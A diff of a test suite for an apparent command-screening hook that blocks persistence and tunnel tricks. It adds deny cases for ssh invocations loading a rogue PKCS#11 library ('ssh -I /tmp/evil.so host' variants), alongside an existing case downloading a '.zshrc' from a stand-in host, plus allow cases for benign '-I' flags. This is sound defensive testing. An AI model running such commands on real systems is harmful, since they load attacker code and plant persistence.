@@ -87,6 +87,11 @@ describe("persistence and tunnel rules: shell forms", () => {
     ["ssh -o PKCS11Provider=/tmp/evil.so host", "ssh-code-loading-option"],
     ["ssh -oSecurityKeyProvider=/tmp/x.so host", "ssh-code-loading-option"],
     ["ssh -I /tmp/evil.so host", "ssh-code-loading-option"],
+    ["ssh -I/tmp/evil.so host", "ssh-code-loading-option"],
+    ["ssh host -I /tmp/evil.so", "ssh-code-loading-option"],
+    ["ssh -fNI /tmp/evil.so host", "ssh-code-loading-option"],
+    ["/usr/bin/ssh -I /tmp/evil.so host", "ssh-code-loading-option"],
+    ["sudo ssh -I /tmp/evil.so host", "ssh-code-loading-option"],
     ["curl -O https://x.example/.zshrc", "shell-rc-download-append"],
   ])("denies %s (%s)", (cmd, rule) => {
     expect(bash(cmd)).toBe(rule);
@@ -117,6 +122,8 @@ describe("persistence and tunnel rules: shell forms", () => {
     // Security review round 4: the same shapes without the harm.
     "ssh -o PKCS11Provider=none host", "ssh -o SecurityKeyProvider= host", "ssh -o \"StrictHostKeyChecking=no\" host",
     "ssh -o 'ProxyCommand=\"ssh -W %h:%p bastion\"' host", "curl -O --output-dir /tmp/dl https://x.example/readme.md",
+    // -I is the PKCS#11 library option only for ssh: python3 -I is isolated mode, gcc -I is an include folder.
+    "python3 -I script.py", "python3 -I -c 'print(1)'", "gcc -I /usr/local/include -o app main.c",
   ])("allows %s", (cmd) => {
     expect(bash(cmd)).toBeUndefined();
   });
@@ -193,11 +200,12 @@ describe("kya hook (spawn e2e): persistence and tunnel rules", () => {
       }
     }, 60000);
 
-    it(`${host}: allows crontab -l, launchctl list, a normal ssh tunnel and a Write to a source file (exit 0, no output)`, () => {
+    it(`${host}: allows crontab -l, launchctl list, a normal ssh tunnel, python3 -I and a Write to a source file (exit 0, no output)`, () => {
       const cases = [
         bashPayload("crontab -l"),
         bashPayload("launchctl list"),
         bashPayload("ssh -N -L 8080:localhost:80 dev.example.com"),
+        bashPayload("python3 -I script.py"),
         writePayload("Write", { file_path: "/p/src/index.ts", content: "export {}" }),
       ];
       for (const stdin of cases) {
